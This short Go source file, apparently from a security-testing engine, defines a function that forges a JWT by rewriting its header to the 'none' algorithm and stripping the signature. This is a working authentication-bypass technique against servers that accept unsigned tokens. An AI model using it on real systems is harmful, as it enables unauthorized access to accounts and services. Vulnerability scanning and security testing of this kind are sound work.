package engine

import (
	"encoding/base64"
	"encoding/json"
	"strings"
)

// forgeJWTNone takes an "Authorization: Bearer <jwt>" value (or a bare JWT) and
// re-encodes it with the "none" algorithm and an empty signature. If the input
// is not a JWT it is returned unchanged.
func forgeJWTNone(authValue string) string {
	prefix := ""
	token := authValue
	if strings.HasPrefix(strings.ToLower(authValue), "bearer ") {
		prefix = authValue[:len("Bearer ")]
		token = strings.TrimSpace(authValue[len("Bearer "):])
	}
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return authValue
	}
	payload := parts[1]
	// Rebuild header as {"alg":"none","typ":"JWT"}.
	hdr := map[string]any{"alg": "none", "typ": "JWT"}
	hb, _ := json.Marshal(hdr)
	newHeader := base64.RawURLEncoding.EncodeToString(hb)
	forged := newHeader + "." + payload + "."
	if prefix != "" {
		return prefix + forged
	}
	return forged
}
